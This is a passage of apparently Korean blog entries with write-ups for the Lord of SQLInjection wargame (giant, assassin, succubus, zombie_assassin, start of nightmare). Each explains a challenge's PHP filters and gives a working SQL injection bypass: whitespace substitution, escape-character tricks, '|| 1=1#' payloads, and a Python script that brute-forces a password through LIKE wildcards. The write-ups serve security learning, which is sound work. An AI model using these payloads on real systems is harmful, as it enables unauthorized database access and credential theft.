@mysqli_fetch_array(mysqli_query(<span class="variable">$db</span>,<span class="variable">$query</span>)); </span><br><span class="line">  <span class="keyword">if</span>(<span class="variable">$result</span>[<span class="number">1234</span>]) solve(<span class="string">&quot;giant&quot;</span>); </span><br><span class="line">  highlight_file(<span class="keyword">__FILE__</span>); </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<br>

<br>

<hr>
<br>

<h1 id="🔔-중요-소스코드-해석"><a href="#🔔-중요-소스코드-해석" class="headerlink" title="🔔 중요 소스코드 해석"></a>🔔 중요 소스코드 해석</h1><br>

<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(strlen(<span class="variable">$_GET</span>[shit])&gt;<span class="number">1</span>) <span class="keyword">exit</span>(<span class="string">&quot;No Hack ~_~&quot;</span>); </span><br><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">&#x27;/ |\n|\r|\t/i&#x27;</span>, <span class="variable">$_GET</span>[shit])) <span class="keyword">exit</span>(<span class="string">&quot;HeHe&quot;</span>); </span><br><span class="line"><span class="variable">$query</span> = <span class="string">&quot;select 1234 from<span class="subst">&#123;$_GET[shit]&#125;</span>prob_giant where 1&quot;</span>;</span><br></pre></td></tr></table></figure>

<br>

<br>

<h2 id="1-줄-해석"><a href="#1-줄-해석" class="headerlink" title="1 줄 해석"></a>1 줄 해석</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(strlen(<span class="variable">$_GET</span>[shit])&gt;<span class="number">1</span>) <span class="keyword">exit</span>(<span class="string">&quot;No Hack ~_~&quot;</span>);</span><br></pre></td></tr></table></figure>

<p><code>shit</code>파라미터의 길이가 1보다 크면 <code>No Hack ~_~</code>을 출력합니다.</p>
<br>

<br>

<h2 id="2-줄-3-줄-해석"><a href="#2-줄-3-줄-해석" class="headerlink" title="2 줄 ~ 3 줄 해석"></a>2 줄 ~ 3 줄 해석</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">&#x27;/ |\n|\r|\t/i&#x27;</span>, <span class="variable">$_GET</span>[shit])) <span class="keyword">exit</span>(<span class="string">&quot;HeHe&quot;</span>); </span><br><span class="line"><span class="variable">$query</span> = <span class="string">&quot;select 1234 from<span class="subst">&#123;$_GET[shit]&#125;</span>prob_giant where 1&quot;</span>;</span><br></pre></td></tr></table></figure>

<p><code>preg_match</code>라는 함수가 있습니다.</p>
<p><code>preg_match</code>함수는 특정한 문자를 필터링할 때 사용합니다.</p>
<p><code>shit 파라미터</code>에서 특수문자 <code>\n</code> <code>\r</code> <code>\t</code> 를 필터링 하고 있습니다. <code>/i</code>는 대소문자를 구분하지 않는다는 뜻입니다.</p>
<br>

<br>

<hr>
<br>

<h1 id="🙆‍♀️-SOLVE"><a href="#🙆‍♀️-SOLVE" class="headerlink" title="🙆‍♀️ SOLVE"></a>🙆‍♀️ SOLVE</h1><br>

<img src="/images/Lord of SQLInjection/giant/solve_1.png">

<br>

<p><code>shit 파라미터</code>를 공백으로 처리해주면 풀립니다.</p>
<p><code>/**/</code> 주석으로 우회를 시도했지만 문자의 길이가 1보다 커서 우회가 안됐습니다.</p>
<br>

<br>

<p><code>%0b</code> : Vertical Tab</p>
<p><code>%0c</code> : Form Feed</p>
<br>

<p>해당 문자로 우회를 하였습니다.</p>
<br>

<img src="/images/Lord of SQLInjection/giant/solve_2.png">

<br>

<br>

<blockquote>
<p>SOLVED !!!</p>
</blockquote>
]]></content>
      <categories>
        <category>Lord of SQLInjection</category>
      </categories>
      <tags>
        <tag>Web</tag>
        <tag>Write UP</tag>
      </tags>
  </entry>
  <entry>
    <title>[Lord of SQLInjection] [15번_assassin] Write UP</title>
    <url>/2021/10/24/2021-10-23-Lord_of_SQLInjection_15_assassin/</url>
    <content><![CDATA[<h1 id="🎨-전체-소스코드"><a href="#🎨-전체-소스코드" class="headerlink" title="🎨 전체 소스코드"></a>🎨 전체 소스코드</h1><br>

<p>15번 문제인 assassin를 클릭하면 아래와 같이 소스코드와 쿼리문이 나옵니다.</p>
<br>

<img src="/images/Lord of SQLInjection/assassin/source.png">

<br>

<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">  <span class="keyword">include</span> <span class="string">&quot;./config.php&quot;</span>; </span><br><span class="line">  login_chk(); </span><br><span class="line">  <span class="variable">$db</span> = dbconnect(); </span><br><span class="line">  <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/\&#x27;/i&#x27;</span>, <span class="variable">$_GET</span>[pw])) <span class="keyword">exit</span>(<span class="string">&quot;No Hack ~_~&quot;</span>); </span><br><span class="line">  <span class="variable">$query</span> = <span class="string">&quot;select id from prob_assassin where pw like &#x27;<span class="subst">&#123;$_GET[pw]&#125;</span>&#x27;&quot;</span>; </span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&quot;&lt;hr&gt;query : &lt;strong&gt;<span class="subst">&#123;$query&#125;</span>&lt;/strong&gt;&lt;hr&gt;&lt;br&gt;&quot;</span>; </span><br><span class="line">  <span class="variable">$result</span> = @mysqli_fetch_array(mysqli_query(<span class="variable">$db</span>,<span class="variable">$query</span>)); </span><br><span class="line">  <span class="keyword">if</span>(<span class="variable">$result</span>[<span class="string">&#x27;id&#x27;</span>]) <span class="keyword">echo</span> <span class="string">&quot;&lt;h2&gt;Hello <span class="subst">&#123;$result[id]&#125;</span>&lt;/h2&gt;&quot;</span>; </span><br><span class="line">  <span class="keyword">if</span>(<span class="variable">$result</span>[<span class="string">&#x27;id&#x27;</span>] == <span class="string">&#x27;admin&#x27;</span>) solve(<span class="string">&quot;assassin&quot;</span>); </span><br><span class="line">  highlight_file(<span class="keyword">__FILE__</span>); </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<br>

<br>

<hr>
<br>

<h1 id="🔔-중요-소스코드-해석"><a href="#🔔-중요-소스코드-해석" class="headerlink" title="🔔 중요 소스코드 해석"></a>🔔 중요 소스코드 해석</h1><br>

<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">&#x27;/\&#x27;/i&#x27;</span>, <span class="variable">$_GET</span>[pw])) <span class="keyword">exit</span>(<span class="string">&quot;No Hack ~_~&quot;</span>); </span><br><span class="line"><span class="variable">$query</span> = <span class="string">&quot;select id from prob_assassin where pw like &#x27;<span class="subst">&#123;$_GET[pw]&#125;</span>&#x27;&quot;</span>; </span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;hr&gt;query : &lt;strong&gt;<span class="subst">&#123;$query&#125;</span>&lt;/strong&gt;&lt;hr&gt;&lt;br&gt;&quot;</span>; </span><br><span class="line"><span class="variable">$result</span> = @mysqli_fetch_array(mysqli_query(<span class="variable">$db</span>,<span class="variable">$query</span>)); </span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$result</span>[<span class="string">&#x27;id&#x27;</span>]) <span class="keyword">echo</span> <span class="string">&quot;&lt;h2&gt;Hello <span class="subst">&#123;$result[id]&#125;</span>&lt;/h2&gt;&quot;</span>; </span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$result</span>[<span class="string">&#x27;id&#x27;</span>] == <span class="string">&#x27;admin&#x27;</span>) solve(<span class="string">&quot;assassin&quot;</span>); </span><br></pre></td></tr></table></figure>

<br>

<br>

<h2 id="1-줄-해석"><a href="#1-줄-해석" class="headerlink" title="1 줄 해석"></a>1 줄 해석</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">&#x27;/\&#x27;/i&#x27;</span>, <span class="variable">$_GET</span>[pw])) <span class="keyword">exit</span>(<span class="string">&quot;No Hack ~_~&quot;</span>); </span><br></pre></td></tr></table></figure>

<p><code>preg_match</code>라는 함수가 있습니다.</p>
<p><code>preg_match</code>함수는 특정한 문자를 필터링할 때 사용합니다.</p>
<p><code>pw 파라미터</code> <code>&#39;</code>를 필터링 하고 있습니다. <code>/i</code>는 대소문자를 구분하지 않는다는 뜻입니다.</p>
<br>

<br>

<h2 id="2-줄-해석"><a href="#2-줄-해석" class="headerlink" title="2 줄 해석"></a>2 줄 해석</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$query</span> = <span class="string">&quot;select id from prob_assassin where pw like &#x27;<span class="subst">&#123;$_GET[pw]&#125;</span>&#x27;&quot;</span>;</span><br></pre></td></tr></table></figure>

<p><code>like</code>는 특정 문자를 몰라도 검색할 수 있는 와일드카드 <code>%</code>와 <code>_</code>를 지원합니다.</p>
<p>예를 들어 <code>%</code>는 S%L 이면 S1231L, SL, SQL 등 을 모두 가져옵니다.</p>
<p>만약 <code>_</code>는 S_L 이면 S1231L, SL은 가져올 수 없고, SQL는 가져올 수 있습니다.</p>
<br>

<br>

<h2 id="6-줄-해석"><a href="#6-줄-해석" class="headerlink" title="6 줄 해석"></a>6 줄 해석</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="variable">$result</span>[<span class="string">&#x27;id&#x27;</span>] == <span class="string">&#x27;admin&#x27;</span>) solve(<span class="string">&quot;assassin&quot;</span>); </span><br></pre></td></tr></table></figure>

<p><code>id</code>가 <code>admin</code>이면 문제가 풀립니다.</p>
<br>

<br>

<hr>
<br>

<h1 id="🙆‍♀️-SOLVE"><a href="#🙆‍♀️-SOLVE" class="headerlink" title="🙆‍♀️ SOLVE"></a>🙆‍♀️ SOLVE</h1><br>

<img src="/images/Lord of SQLInjection/assassin/solve_1.png">

<br>

<p>일단 확인을 위해 <code>%</code>만 넣어주었습니다.</p>
<p><code>Hello guest</code>라고 나오는 것을 보아 테이블의 행은 <code>admin</code>보다 <code>guest</code>가 위에 있는 것을 확인할 수 있습니다.</p>
<br>

<br>

<p>일단 <code>pw</code>길이를 알아보기 위해 <code>_</code>를 하나씩 추가하면서 길이를 찾아보았습니다.</p>
<p>8개를 넣었더니 <code>Hello guest</code>가 출력되었습니다.</p>
<p><code>pw</code> 길이는 8글자입니다.</p>
<br>

<img src="/images/Lord of SQLInjection/assassin/solve_2.png">

<br>

<br>

<p>한 글자 씩 대입하려면 시간이 오래 걸리기 때문에 파이썬을 사용해 줍니다.</p>
<br>

<br>

<h2 id="파이썬-코드"><a href="#파이썬-코드" class="headerlink" title="파이썬 코드"></a>파이썬 코드</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;https://los.rubiya.kr/chall/assassin_14a1fd552c61c60f034879e5d4171373.php?pw=&quot;</span></span><br><span class="line">head = &#123;<span class="string">&#x27;Cookie&#x27;</span> : <span class="string">&#x27;PHPSESSID=값&#x27;</span>&#125;</span><br><span class="line"></span><br><span class="line">length = <span class="number">1</span></span><br><span class="line">pwd = <span class="string">&#x27;&#x27;</span></span><br><span class="line">query = <span class="string">&quot;_&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> (<span class="number">1</span>):</span><br><span class="line">    query = <span class="string">&quot;&#123;&#125;&quot;</span>.<span class="built_in">format</span>(query)</span><br><span class="line">    req = requests.get(url+query, headers=head)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[ +&quot;</span>,length,<span class="string">&quot;]&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;Hello guest&quot;</span> <span class="keyword">in</span> req.text:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;총 길이는&quot;</span>,length)</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        length = length + <span class="number">1</span></span><br><span class="line">        query = query + <span class="string">&quot;_&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, length+<span class="number">1</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;찾는중.. &quot;</span>,i,<span class="string">&quot;번째 문자&quot;</span>)</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">48</span>, <span class="number">122</span>):</span><br><span class="line">        query = <span class="string">&quot;_&quot;</span> * (i-<span class="number">1</span>) + <span class="built_in">chr</span>(j) + <span class="string">&quot;_&quot;</span> * (length-i)</span><br><span class="line">        req = requests.get(url+query, headers=head)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;Hello admin&quot;</span> <span class="keyword">in</span> req.text:</span><br><span class="line">            pwd += <span class="built_in">chr</span>(j)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">elif</span> <span class="string">&quot;Hello guest&quot;</span> <span class="keyword">in</span> req.text:</span><br><span class="line">            result = <span class="built_in">chr</span>(j)</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(pwd)&lt;i:</span><br><span class="line">        pwd = pwd + result</span><br><span class="line">            </span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;pw : &quot;</span>,pwd)</span><br></pre></td></tr></table></figure>



<br>

<img src="/images/Lord of SQLInjection/assassin/solve_3.png">

<br>

<p>자동으로 <code>pw</code>의 길이와 <code>pw</code>를 구해 줍니다.</p>
<br>

<br>

<p>파이썬 코드를 돌려서 나온 <code>pw</code> 값을 넣어주면 문제가 풀립니다.</p>
<img src="/images/Lord of SQLInjection/assassin/solve_4.png">

<br>

<br>

<blockquote>
<p>SOLVED !!!</p>
</blockquote>
]]></content>
      <categories>
        <category>Lord of SQLInjection</category>
      </categories>
      <tags>
        <tag>Web</tag>
        <tag>Write UP</tag>
      </tags>
  </entry>
  <entry>
    <title>[Lord of SQLInjection] [16번_succubus] Write UP</title>
    <url>/2021/11/13/2021-11-13-Lord_of_SQLInjection_16_succubus/</url>
    <content><![CDATA[<h1 id="🎨-전체-소스코드"><a href="#🎨-전체-소스코드" class="headerlink" title="🎨 전체 소스코드"></a>🎨 전체 소스코드</h1><br>

<p>16번 문제인 succubus를 클릭하면 아래와 같이 소스코드와 쿼리문이 나옵니다.</p>
<br>

<img src="/images/Lord of SQLInjection/succubus/source.png">

<br>

<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">  <span class="keyword">include</span> <span class="string">&quot;./config.php&quot;</span>; </span><br><span class="line">  login_chk();</span><br><span class="line">  <span class="variable">$db</span> = dbconnect();</span><br><span class="line">  <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/prob|_|\.|\(\)/i&#x27;</span>, <span class="variable">$_GET</span>[id])) <span class="keyword">exit</span>(<span class="string">&quot;No Hack ~_~&quot;</span>); </span><br><span class="line">  <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/prob|_|\.|\(\)/i&#x27;</span>, <span class="variable">$_GET</span>[pw])) <span class="keyword">exit</span>(<span class="string">&quot;No Hack ~_~&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/\&#x27;/&#x27;</span>,<span class="variable">$_GET</span>[id])) <span class="keyword">exit</span>(<span class="string">&quot;HeHe&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/\&#x27;/&#x27;</span>,<span class="variable">$_GET</span>[pw])) <span class="keyword">exit</span>(<span class="string">&quot;HeHe&quot;</span>);</span><br><span class="line">  <span class="variable">$query</span> = <span class="string">&quot;select id from prob_succubus where id=&#x27;<span class="subst">&#123;$_GET[id]&#125;</span>&#x27; and pw=&#x27;<span class="subst">&#123;$_GET[pw]&#125;</span>&#x27;&quot;</span>; </span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&quot;&lt;hr&gt;query : &lt;strong&gt;<span class="subst">&#123;$query&#125;</span>&lt;/strong&gt;&lt;hr&gt;&lt;br&gt;&quot;</span>; </span><br><span class="line">  <span class="variable">$result</span> = @mysqli_fetch_array(mysqli_query(<span class="variable">$db</span>,<span class="variable">$query</span>)); </span><br><span class="line">  <span class="keyword">if</span>(<span class="variable">$result</span>[<span class="string">&#x27;id&#x27;</span>]) solve(<span class="string">&quot;succubus&quot;</span>); </span><br><span class="line">  highlight_file(<span class="keyword">__FILE__</span>); </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<br>

<br>

<hr>
<br>

<h1 id="🔔-중요-소스코드-해석"><a href="#🔔-중요-소스코드-해석" class="headerlink" title="🔔 중요 소스코드 해석"></a>🔔 중요 소스코드 해석</h1><br>

<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">&#x27;/prob|_|\.|\(\)/i&#x27;</span>, <span class="variable">$_GET</span>[id])) <span class="keyword">exit</span>(<span class="string">&quot;No Hack ~_~&quot;</span>); </span><br><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">&#x27;/prob|_|\.|\(\)/i&#x27;</span>, <span class="variable">$_GET</span>[pw])) <span class="keyword">exit</span>(<span class="string">&quot;No Hack ~_~&quot;</span>);</span><br><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">&#x27;/\&#x27;/&#x27;</span>,<span class="variable">$_GET</span>[id])) <span class="keyword">exit</span>(<span class="string">&quot;HeHe&quot;</span>);</span><br><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">&#x27;/\&#x27;/&#x27;</span>,<span class="variable">$_GET</span>[pw])) <span class="keyword">exit</span>(<span class="string">&quot;HeHe&quot;</span>); </span><br></pre></td></tr></table></figure>

<br>

<br>

<h2 id="1-줄-4-줄-해석"><a href="#1-줄-4-줄-해석" class="headerlink" title="1 줄 ~ 4 줄 해석"></a>1 줄 ~ 4 줄 해석</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">&#x27;/prob|_|\.|\(\)/i&#x27;</span>, <span class="variable">$_GET</span>[id])) <span class="keyword">exit</span>(<span class="string">&quot;No Hack ~_~&quot;</span>); </span><br><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">&#x27;/prob|_|\.|\(\)/i&#x27;</span>, <span class="variable">$_GET</span>[pw])) <span class="keyword">exit</span>(<span class="string">&quot;No Hack ~_~&quot;</span>);</span><br><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">&#x27;/\&#x27;/&#x27;</span>,<span class="variable">$_GET</span>[id])) <span class="keyword">exit</span>(<span class="string">&quot;HeHe&quot;</span>);</span><br><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">&#x27;/\&#x27;/&#x27;</span>,<span class="variable">$_GET</span>[pw])) <span class="keyword">exit</span>(<span class="string">&quot;HeHe&quot;</span>); </span><br></pre></td></tr></table></figure>

<p><code>preg_match</code>라는 함수가 있습니다.</p>
<p><code>preg_match</code>함수는 특정한 문자를 필터링할 때 사용합니다.</p>
<p><code>id와 pw 파라미터</code>에서 <code>prob</code>, <code>_</code>, <code>.</code>, <code>()</code>, <code>&#39;</code>를 필터링 하고 있습니다. <code>/i</code>는 대소문자를 구분하지 않는다는 뜻입니다.</p>
<br>

<br>

<hr>
<br>

<h1 id="🙆‍♀️-SOLVE"><a href="#🙆‍♀️-SOLVE" class="headerlink" title="🙆‍♀️ SOLVE"></a>🙆‍♀️ SOLVE</h1><br>

<img src="/images/Lord of SQLInjection/succubus/solve_1.png">

<br>

<p>이스케이프 문자를 이용하여 중간에 <code>&#39;</code>를 문자열로 처리해주었습니다.</p>
<br>

<p>id = <code>&#39;\&#39; and pw =&#39;</code> || 1=1#</p>
<p><code>id</code> 파라미터를 참으로 만들어주어 문제를 풀었습니다.</p>
<br>

<br>

<blockquote>
<p>SOLVED !!!</p>
</blockquote>
]]></content>
      <categories>
        <category>Lord of SQLInjection</category>
      </categories>
      <tags>
        <tag>Web</tag>
        <tag>Write UP</tag>
      </tags>
  </entry>
  <entry>
    <title>[Lord of SQLInjection] [17번_zombie_assassin] Write UP</title>
    <url>/2021/11/13/2021-11-13-Lord_of_SQLInjection_17_zombie_assassin/</url>
    <content><![CDATA[<h1 id="🎨-전체-소스코드"><a href="#🎨-전체-소스코드" class="headerlink" title="🎨 전체 소스코드"></a>🎨 전체 소스코드</h1><br>

<p>17번 문제인 zombie_assassin를 클릭하면 아래와 같이 소스코드와 쿼리문이 나옵니다.</p>
<br>

<img src="/images/Lord of SQLInjection/zombie_assassin/source.png">

<br>

<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">  <span class="keyword">include</span> <span class="string">&quot;./config.php&quot;</span>; </span><br><span class="line">  login_chk(); </span><br><span class="line">  <span class="variable">$db</span> = dbconnect();</span><br><span class="line">  <span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>] = strrev(addslashes(<span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>]));</span><br><span class="line">  <span class="variable">$_GET</span>[<span class="string">&#x27;pw&#x27;</span>] = strrev(addslashes(<span class="variable">$_GET</span>[<span class="string">&#x27;pw&#x27;</span>]));</span><br><span class="line">  <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/prob|_|\.|\(\)/i&#x27;</span>, <span class="variable">$_GET</span>[id])) <span class="keyword">exit</span>(<span class="string">&quot;No Hack ~_~&quot;</span>); </span><br><span class="line">  <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/prob|_|\.|\(\)/i&#x27;</span>, <span class="variable">$_GET</span>[pw])) <span class="keyword">exit</span>(<span class="string">&quot;No Hack ~_~&quot;</span>); </span><br><span class="line">  <span class="variable">$query</span> = <span class="string">&quot;select id from prob_zombie_assassin where id=&#x27;<span class="subst">&#123;$_GET[id]&#125;</span>&#x27; and pw=&#x27;<span class="subst">&#123;$_GET[pw]&#125;</span>&#x27;&quot;</span>; </span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&quot;&lt;hr&gt;query : &lt;strong&gt;<span class="subst">&#123;$query&#125;</span>&lt;/strong&gt;&lt;hr&gt;&lt;br&gt;&quot;</span>; </span><br><span class="line">  <span class="variable">$result</span> = @mysqli_fetch_array(mysqli_query(<span class="variable">$db</span>,<span class="variable">$query</span>)); </span><br><span class="line">  <span class="keyword">if</span>(<span class="variable">$result</span>[<span class="string">&#x27;id&#x27;</span>]) solve(<span class="string">&quot;zombie_assassin&quot;</span>); </span><br><span class="line">  highlight_file(<span class="keyword">__FILE__</span>); </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<br>

<br>

<hr>
<br>

<h1 id="🔔-중요-소스코드-해석"><a href="#🔔-중요-소스코드-해석" class="headerlink" title="🔔 중요 소스코드 해석"></a>🔔 중요 소스코드 해석</h1><br>

<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>] = strrev(addslashes(<span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>]));</span><br><span class="line"><span class="variable">$_GET</span>[<span class="string">&#x27;pw&#x27;</span>] = strrev(addslashes(<span class="variable">$_GET</span>[<span class="string">&#x27;pw&#x27;</span>]));</span><br><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">&#x27;/prob|_|\.|\(\)/i&#x27;</span>, <span class="variable">$_GET</span>[id])) <span class="keyword">exit</span>(<span class="string">&quot;No Hack ~_~&quot;</span>); </span><br><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">&#x27;/prob|_|\.|\(\)/i&#x27;</span>, <span class="variable">$_GET</span>[pw])) <span class="keyword">exit</span>(<span class="string">&quot;No Hack ~_~&quot;</span>);  </span><br></pre></td></tr></table></figure>

<br>

<br>

<h2 id="1-줄-2-줄-해석"><a href="#1-줄-2-줄-해석" class="headerlink" title="1 줄 ~ 2 줄 해석"></a>1 줄 ~ 2 줄 해석</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>] = strrev(addslashes(<span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>]));</span><br><span class="line"><span class="variable">$_GET</span>[<span class="string">&#x27;pw&#x27;</span>] = strrev(addslashes(<span class="variable">$_GET</span>[<span class="string">&#x27;pw&#x27;</span>])); </span><br></pre></td></tr></table></figure>

<p><code>strrev</code>라는 함수가 있습니다.</p>
<p><code>strrev</code>함수는 인자로 받은 문자열의 순서를 뒤집은 상태로 반환 해주는 함수입니다.</p>
<p>즉, <code>id</code> 파라미터에 <code>admin</code>이 들어오면 <code>nimda</code>가 반환됩니다.</p>
<br>

<br>

<h2 id="3-줄-4-줄-해석"><a href="#3-줄-4-줄-해석" class="headerlink" title="3 줄 ~ 4 줄 해석"></a>3 줄 ~ 4 줄 해석</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">&#x27;/prob|_|\.|\(\)/i&#x27;</span>, <span class="variable">$_GET</span>[id])) <span class="keyword">exit</span>(<span class="string">&quot;No Hack ~_~&quot;</span>); </span><br><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">&#x27;/prob|_|\.|\(\)/i&#x27;</span>, <span class="variable">$_GET</span>[pw])) <span class="keyword">exit</span>(<span class="string">&quot;No Hack ~_~&quot;</span>);   </span><br></pre></td></tr></table></figure>

<p><code>preg_match</code>라는 함수가 있습니다.</p>
<p><code>preg_match</code>함수는 특정한 문자를 필터링 할 때 사용합니다.</p>
<p><code>id와 pw 파라미터</code>에서 <code>prob</code>, <code>_</code>, <code>.</code>, <code>()</code>, 를 필터링 하고 있습니다. <code>/i</code>는 대소문자를 구분하지 않는다는 뜻입니다.</p>
<br>

<br>

<hr>
<br>

<h1 id="🙆‍♀️-SOLVE"><a href="#🙆‍♀️-SOLVE" class="headerlink" title="🙆‍♀️ SOLVE"></a>🙆‍♀️ SOLVE</h1><br>

<img src="/images/Lord of SQLInjection/zombie_assassin/solve_1.png">

<br>

<p><code>id</code> 파라미터에 <code>&quot;</code>를 넣어주었습니다. <code>addslashes</code>함수에 의해 <code>\&quot;</code> 이렇게 변환되지만, <code>strrev</code>함수로 인해 <code>&quot;\</code>로 변환됩니다.</p>
<p><code>succubus</code> 문제처럼 문자열로 만들어주었습니다.</p>
<br>

<p>id = <code>&#39;&quot;\&#39; and pw = &#39;</code> || 1=1#</p>
<p>이와 같이 문자열로 만들어 준 후 <code>pw</code> 파라미터에는 <code>%231=1||</code>를 넣어주었습니다.</p>
<p><code>pw</code> 파라미터에서 <code>strrev</code>함수에 의해 <code>||1=1#</code>이 반환이 됩니다.</p>
<br>

<br>

<blockquote>
<p>SOLVED !!!</p>
</blockquote>
]]></content>
      <categories>
        <category>Lord of SQLInjection</category>
      </categories>
      <tags>
        <tag>Web</tag>
        <tag>Write UP</tag>
      </tags>
  </entry>
  <entry>
    <title>[Lord of SQLInjection] [18번_nightmare] Write UP</title>
    <url>/2021/11/14/2021-11-14-Lord_of_SQLInjection_18_nightmare/</url>
    <content><![CDATA[<h1 id="🎨-전체-소스코드"><a href="#🎨-전체-소스코드" class="headerlink" title="🎨 전체 소스코드"></a>🎨 전체 소스코드</h1><br>

<p>18번 문제인 nightmare를 클릭하면 아래와 같이 소스코드와 쿼리문이 나옵니다.</p>
<br>

<img src="/images/Lord of SQLInjection/nightmare/source.png">

<br>

<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">  <span class="keyword">include</span> <span class="string">&quot;./config.php&quot;</span>; </span><br><span class="line">  login_chk(); </span><br><span class="line">  <span class="variable">$db</span> = dbconnect(); </span><br><span class="line">  <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/prob|_|\.|\(\)|#|-/i&#x27;</span>, <span class="variable">$_GET</span>[pw])) <span class="keyword">exit</span>(<span class="string">&quot;No Hack ~_~&quot;</span>); </span><br><span class="line">  <span class="keyword">if</span>(strlen(<span class="variable">$_GET</span>[pw])&gt;<span class="number">6</span>) <span class="keyword">exit</span>(<span class="string">&quot;No Hack ~_~&quot;</span>); </span><br><span class="line">  <span class="variable">$query</span> = <span class="string">&quot;select id from prob_nightmare where pw=(&#x27;<span class="subst">&#123;$_GET[pw]&#125;</span>&#x27;) and id!=&#x27;admin&#x27;&quot;</span>; </span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&quot;&lt;hr&gt;query : &lt;strong&gt;<span class="subst">&#123;$query&#125;</span>&lt;/strong&gt;&lt;hr&gt;&lt;br&gt;&quot;</span>; </span><br><span class="line">  <span class="variable">$result</span> = @mysqli_fetch_array(mysqli_query(<span class="variable">$db</span>,<span class="variable">$query</span>)); </span><br><span class="line">  <span class="keyword">if</span>(<span class="variable">$result</span>[<span class="string">&#x27;id&#x27;</span>]) solve(<span class="string">&quot;nightmare&quot;</span>); </span><br><span class="line">  highlight_file(<span class="keyword">__FILE__</span>); </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<br>

<br>

<hr>
<br>

<h1 id="🔔-중요-소스코드-해석"><a href="#🔔-중요-소스코드-해석" class="headerlink" title="🔔 중요 소스코드 해석"></a>🔔 중요 소스코드 해석</h1><br>

